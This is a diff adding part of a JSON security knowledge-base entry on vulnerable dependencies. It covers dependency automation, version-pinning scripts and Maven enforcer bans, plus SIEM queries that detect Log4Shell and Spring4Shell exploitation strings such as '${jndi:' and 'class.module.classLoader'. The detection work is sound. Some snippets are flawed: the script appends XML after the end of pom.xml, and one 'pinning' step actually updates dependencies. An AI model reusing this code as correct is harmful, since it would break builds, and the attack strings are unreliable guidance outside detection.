\"pin\",\n    \"lockFileMaintenance\": {\n      \"enabled\": true,\n      \"schedule\": [\"before 6am on monday\"]\n    }\n  },\n  \n  \"python\": {\n    \"enabled\": true\n  },\n  \n  \"docker\": {\n    \"enabled\": true,\n    \"pinDigests\": true\n  },\n  \n  \"ignoreDeps\": [\n    \"node\",\n    \"npm\"\n  ]\n}\n\n---\n# .github/workflows/dependency-update-test.yml\n# Automated testing for dependency updates\nname: Test Dependency Updates\n\non:\n  pull_request:\n    branches: [main]\n    paths:\n      - 'pom.xml'\n      - 'package.json'\n      - 'requirements.txt'\n      - 'go.mod'\n\njobs:\n  test-dependency-update:\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Run Full Test Suite\n        run: |\n          ./mvnw clean test\n          npm test\n          pytest\n      \n      - name: Security Scan\n        run: |\n          mvn org.owasp:dependency-check-maven:check\n      \n      - name: Auto-approve if patch update\n        if: contains(github.event.pull_request.labels.*.name, 'dependencies') && contains(github.event.pull_request.title, 'patch')\n        uses: hmarr/auto-approve-action@v3\n        with:\n          github-token: ${{ secrets.GITHUB_TOKEN }}"
+      },
+      "tools": [
+        {
+          "name": "GitHub Dependabot",
+          "type": "Automated Dependency Updates",
+          "cost": "Free (included with GitHub)"
+        },
+        {
+          "name": "Renovate Bot",
+          "type": "Universal Dependency Automation",
+          "cost": "Free (OSS) / $75/month (hosted)"
+        },
+        {
+          "name": "Snyk",
+          "type": "Automated Fix PRs",
+          "cost": "$52/dev/month"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.6.1 - Management of technical vulnerabilities",
+        "A.14.2.3 - Technical review of applications after operating platform changes"
+      ],
+      "nist_csf": [
+        "PR.IP-12 - A vulnerability management plan is developed and implemented",
+        "PR.MA-1 - Maintenance is performed regularly"
+      ],
+      "validation_steps": [
+        "Create .github/dependabot.yml or renovate.json configuration",
+        "Test configuration on sample repository",
+        "Verify dependency update PRs are created automatically",
+        "Configure auto-merge rules for patch updates with passing tests",
+        "Set up notifications for security-critical updates",
+        "Review and merge first batch of dependency updates"
+      ]
+    },
+    {
+      "control_id": "MIT-004",
+      "title": "Implement Version Pinning and Dependency Lock Files",
+      "description": "Pin all dependency versions explicitly in lock files (package-lock.json, requirements.txt, go.sum) and enforce their use in production deployments to prevent unexpected updates.",
+      "effectiveness": "Medium",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "bash",
+        "framework": "Multi-language Dependency Pinning",
+        "code": "#!/bin/bash\n# dependency-pinning.sh - Enforce version pinning across projects\n\nset -e\n\necho \"=== Enforcing Dependency Version Pinning ===\"\n\n# 1. Maven - Use dependency:tree and versions plugin\nif [ -f \"pom.xml\" ]; then\n  echo \"\\n📦 Maven Dependencies\"\n  \n  # Lock Maven versions\n  mvn versions:lock-snapshots\n  mvn versions:resolve-ranges\n  \n  # Generate dependency tree\n  mvn dependency:tree -DoutputFile=dependency-tree.txt\n  \n  # Enforce version properties in pom.xml\n  cat << 'EOF' >> pom.xml\n<!-- Version pinning in properties -->\n<properties>\n  <!-- Critical libraries - pin exact versions -->\n  <log4j.version>2.21.1</log4j.version>\n  <spring.version>5.3.31</spring.version>\n  <jackson.version>2.15.3</jackson.version>\n  <commons-collections.version>3.2.2</commons-collections.version>\n  \n  <!-- Enforce dependency convergence -->\n  <enforcer.plugin.version>3.4.1</enforcer.plugin.version>\n</properties>\n\n<build>\n  <plugins>\n    <!-- Enforce dependency rules -->\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-enforcer-plugin</artifactId>\n      <version>${enforcer.plugin.version}</version>\n      <executions>\n        <execution>\n          <id>enforce-versions</id>\n          <goals>\n            <goal>enforce</goal>\n          </goals>\n          <configuration>\n            <rules>\n              <!-- Require specific Java version -->\n              <requireJavaVersion>\n                <version>[17,18)</version>\n              </requireJavaVersion>\n              \n              <!-- Ban vulnerable versions -->\n              <bannedDependencies>\n                <excludes>\n                  <!-- Ban all Log4j 2.0-2.16.0 (Log4Shell) -->\n                  <exclude>org.apache.logging.log4j:log4j-core:(,2.17.1)</exclude>\n                  \n                  <!-- Ban vulnerable Spring versions -->\n                  <exclude>org.springframework:spring-core:(,5.3.18)</exclude>\n                  <exclude>org.springframework:spring-webmvc:(,5.3.18)</exclude>\n                  \n                  <!-- Ban vulnerable Jackson versions -->\n                  <exclude>com.fasterxml.jackson.core:jackson-databind:(,2.13.4)</exclude>\n                  \n                  <!-- Ban Commons Collections 3.x (deserialization vulns) -->\n                  <exclude>commons-collections:commons-collections:[3.0,3.2.2)</exclude>\n                </excludes>\n              </bannedDependencies>\n              \n              <!-- Enforce dependency convergence (no version conflicts) -->\n              <dependencyConvergence/>\n              \n              <!-- Require release versions (no SNAPSHOTs in prod) -->\n              <requireReleaseDeps>\n                <message>No Snapshots Allowed in production!</message>\n                <onlyWhenRelease>true</onlyWhenRelease>\n              </requireReleaseDeps>\n            </rules>\n            <fail>true</fail>\n          </configuration>\n        </execution>\n      </executions>\n    </plugin>\n  </plugins>\n</build>\nEOF\n  \n  echo \"✅ Maven version pinning configured\"\nfi\n\n# 2. npm - Pin all versions in package.json and use package-lock.json\nif [ -f \"package.json\" ]; then\n  echo \"\\n📦 npm Dependencies\"\n  \n  # Create/update .npmrc to enforce pinning\n  cat << 'EOF' > .npmrc\n# Enforce exact versions\nsave-exact=true\npackage-lock=true\nengine-strict=true\n\n# Security settings\naudit=true\naudit-level=moderate\n\n# Disable automatic updates\nsave-prefix=''\nEOF\n  \n  # Pin all dependencies to exact versions\n  npm install --save-exact\n  \n  # Update package.json to remove version ranges\n  node << 'NODEJS'\nconst fs = require('fs');\nconst packageJson = JSON.parse(fs.readFileSync('package.json', 'utf8'));\n\n// Remove version ranges (^, ~, >=, etc.)\nfunction pinVersions(deps) {\n  if (!deps) return;\n  \n  for (let pkg in deps) {\n    // Remove prefixes like ^, ~, >=\n    deps[pkg] = deps[pkg].replace(/[^\\d\\.\\-]/g, '');\n  }\n}\n\npinVersions(packageJson.dependencies);\npinVersions(packageJson.devDependencies);\n\nfs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));\nconsole.log('✅ npm versions pinned');\nNODEJS\n  \n  # Verify package-lock.json exists\n  if [ ! -f \"package-lock.json\" ]; then\n    echo \"❌ ERROR: package-lock.json not found!\"\n    npm install --package-lock-only\n  fi\n  \n  echo \"✅ npm version pinning configured\"\nfi\n\n# 3. Python - Pin all versions in requirements.txt\nif [ -f \"requirements.txt\" ]; then\n  echo \"\\n📦 Python Dependencies\"\n  \n  # Generate pinned requirements with pip-compile\n  pip install pip-tools\n  \n  # Create requirements.in (unpinned)\n  if [ ! -f \"requirements.in\" ]; then\n    cp requirements.txt requirements.in\n  fi\n  \n  # Compile to pinned requirements.txt\n  pip-compile --generate-hashes --output-file=requirements.txt requirements.in\n  \n  # Verify all versions are pinned (no >= or ~=)\n  if grep -E \"(>=|~=|>|<)\" requirements.txt; then\n    echo \"⚠️ WARNING: Unpinned versions found in requirements.txt\"\n  fi\n  \n  echo \"✅ Python version pinning configured\"\nfi\n\n# 4. Go - Use go.sum for reproducible builds\nif [ -f \"go.mod\" ]; then\n  echo \"\\n📦 Go Dependencies\"\n  \n  # Ensure go.sum exists\n  go mod download\n  go mod verify\n  \n  # Pin dependencies to specific versions\n  go get -u=patch  # Only patch updates\n  \n  echo \"✅ Go version pinning configured\"\nfi\n\n# 5. Dockerfile - Pin base image versions\nif [ -f \"Dockerfile\" ]; then\n  echo \"\\n📦 Docker Images\"\n  \n  # Check for unpinned base images\n  if grep -E \"FROM .+:latest\" Dockerfile; then\n    echo \"⚠️ WARNING: Unpinned :latest tag found in Dockerfile\"\n    echo \"Replace with specific version tags\"\n  fi\n  \n  # Pin to SHA256 digest\n  echo \"Example pinned Dockerfile:\"\n  cat << 'EOF'\nFROM node:20.11.0-alpine@sha256:bf77dc26e48ea95fca9d1aceb5acfa69d2e546b765ec2abfb502975f1a2d4def\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY . .\nUSER node\nCMD [\"node\", \"index.js\"]\nEOF\nfi\n\necho \"\\n=== Version Pinning Complete ===\"\necho \"Verify configurations and commit lock files to version control\""
+      },
+      "tools": [
+        {
+          "name": "pip-tools",
+          "type": "Python Dependency Compiler",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Maven Enforcer Plugin",
+          "type": "Dependency Rule Enforcement",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "npm shrinkwrap",
+          "type": "Lock File Generator",
+          "cost": "Free (built-in)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.9 - System acceptance testing",
+        "A.12.5.1 - Installation of software on operational systems"
+      ],
+      "nist_csf": [
+        "PR.IP-1 - A baseline configuration is created and maintained",
+        "PR.DS-6 - Integrity checking mechanisms verify software integrity"
+      ],
+      "validation_steps": [
+        "Pin all dependency versions in lock files",
+        "Configure enforcer rules to ban vulnerable versions",
+        "Commit lock files (package-lock.json, go.sum, etc.) to version control",
+        "Use 'npm ci' instead of 'npm install' in CI/CD",
+        "Verify Dockerfile uses pinned image tags with SHA256 digests",
+        "Test build reproducibility across different environments"
+      ]
+    }
+  ],
+  "detection": {
+    "indicators": [
+      "Sudden application errors after dependency update",
+      "Unexpected network connections to external IPs during startup",
+      "Increased memory or CPU usage after library upgrade",
+      "Log entries showing deserialization errors or JNDI lookups",
+      "Security scanner alerts for known CVEs in installed packages",
+      "SBOM discrepancies between declared and actual dependencies",
+      "Unscheduled dependency updates in production without change tickets",
+      "Application crashes with stack traces mentioning vulnerable libraries",
+      "WAF alerts for exploitation attempts (e.g., ${jndi: payloads)",
+      "Antivirus or EDR alerts during application runtime"
+    ],
+    "log_queries": [
+      {
+        "siem": "Azure Sentinel (KQL)",
+        "query": "// Detect Log4Shell exploitation attempts\nAppServiceHTTPLogs\n| where TimeGenerated > ago(24h)\n| extend UserAgent = tostring(parse_json(RequestHeaders)[\"User-Agent\"])\n| extend Referer = tostring(parse_json(RequestHeaders)[\"Referer\"])\n| extend XForwardedFor = tostring(parse_json(RequestHeaders)[\"X-Forwarded-For\"])\n| where UserAgent contains \"${jndi:\" or Referer contains \"${jndi:\" or CsUriQuery contains \"${jndi:\"\n| extend Payload = case(\n    UserAgent contains \"${jndi:\", UserAgent,\n    Referer contains \"${jndi:\", Referer,\n    CsUriQuery contains \"${jndi:\", CsUriQuery,\n    \"Unknown\"\n  )\n| extend ThreatType = case(\n    Payload contains \"ldap://\", \"JNDI LDAP Injection\",\n    Payload contains \"rmi://\", \"JNDI RMI Injection\",\n    Payload contains \"dns://\", \"JNDI DNS Injection\",\n    \"JNDI Injection\"\n  )\n| project TimeGenerated, CIp, CsMethod, CsUriStem, ScStatus, ThreatType, Payload\n| order by TimeGenerated desc"
+      },
+      {
+        "siem": "Splunk (SPL)",
+        "query": "# Detect Spring4Shell exploitation\nindex=web_logs sourcetype=access_combined\n| rex field=_raw \"class\\\\.module\\\\.classLoader\\\\.resources\\\\.context\\\\.parent\\\\.pipeline\"\n| where isnotnull(class.module.classLoader.resources.context.parent.pipeline)\n| eval threat_type=\"Spring4Shell CVE-2022-22965\"\n| stats count by src_ip, uri_path, threat_type, _time\n| where count > 1\n| sort -_time"
+      },
+      {
+        "siem": "Elastic Stack (EQL)",
+        "query": "// Detect exploitation of vulnerable dependencies\nsequence by host.name with maxspan=5m\n  [process where process.name == \"java\" and \n   process.command_line : \"*log4j*\" or process.command_line : \"*spring*\"]\n  [network where process.name == \"java\" and \n   destination.ip not in (\"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\") and\n   destination.port in (389, 636, 1389, 1099)]\n  [file where event.action in (\"creation\", \"modification\") and \n   file.extension in (\"class\", \"jar\", \"jsp\")]"
+      },
+      {
+        "siem": "Sumo Logic",
+        "query": "# Detect CVE exploitation patterns\n_sourceCategory=application\n(\"${jndi:\" OR \"class.module.classLoader\" OR \"java.lang.Runtime.exec\")\n| parse regex \"(?<exploit_pattern>\\${jndi:[^}]+}|class\\.module\\.classLoader[^\\s]+)\"\n| where !isNull(exploit_pattern)\n| count by _sourceHost, exploit_pattern, _timeslice 5m\n| where _count > 5"
+      }
+    ],
+    "tools": [
+      {
+        "name": "Log4j Scanner",
+        "type": "Log4Shell Detection Tool",
+        "usage": "Scans filesystems and JAR files for vulnerable Log4j versions"
+      },
+      {
+        "name": "Wiz.io Runtime Scanner",
+        "type": "Cloud Workload Vulnerability Scanner",
+        "usage": "Detects vulnerable libraries in running containers and VMs"
+      },
+      {
+        "name": "AWS Inspector",
+        "type": "Vulnerability Assessment Service",
+        "usage": "Automatically scans EC2 instances and containers for CVEs"
+      },
+      {
+        "name": "Tenable.io",
+        "type": "Vulnerability Management Platform",
+        "usage": "Continuous vulnerability scanning and prioritization based on exploitability"
+      }
+    ]
+  },
+  "metadata_tags": {
+    "industry": [
+      "All Industries",
+      "Financial Services",
+      "Healthcare",
+      "E-commerce",
+      "Government",
+      "Technology",
+      "Manufacturing",
+      "Retail"
+    ],
+    "compliance": [
+      "ISO 27001:2022 (A.8.1 - Asset Management, A.12.6 - Vulnerability Management)",
+      "NIST SSDF 1.1 (PW.4 - Review and Verify Third-Party Software)",
+      "PCI-DSS 4.0 (Requirement 6.3.2 - Inventory of Software Components)",
+      "SOC 2 Type II (CC7.1, CC8.1 - System Operations)",
+      "OWASP ASVS 4.0 (V14.2 - Dependency Verification)",
+      "GDPR Article 32 (Security of Processing)",
+      "HIPAA Security Rule (§164.308(a)(5)(ii)(B) - Protection from Malicious Software)",
+      "Executive Order 14028 (SBOM Requirements)",
+      "CIS Controls v8 (2.1, 2.2 - Software Asset Management)",
+      "NIST 800-53 Rev 5 (SA-10, SI-2 - Flaw Remediation)"
+    ],
+    "deployment": [
+      "Cloud (AWS, Azure, GCP)",
+      "On-Premise",
+      "Hybrid Cloud",
+      "Kubernetes",
+      "Containers",
+      "Serverless",
+      "Microservices"
+    ],
+    "data_classification": [
+      "Critical",
+      "Confidential",
+      "PII",
+      "PHI",
+      "Financial Data",
+      "Intellectual Property"
+    ]
+  }
+}
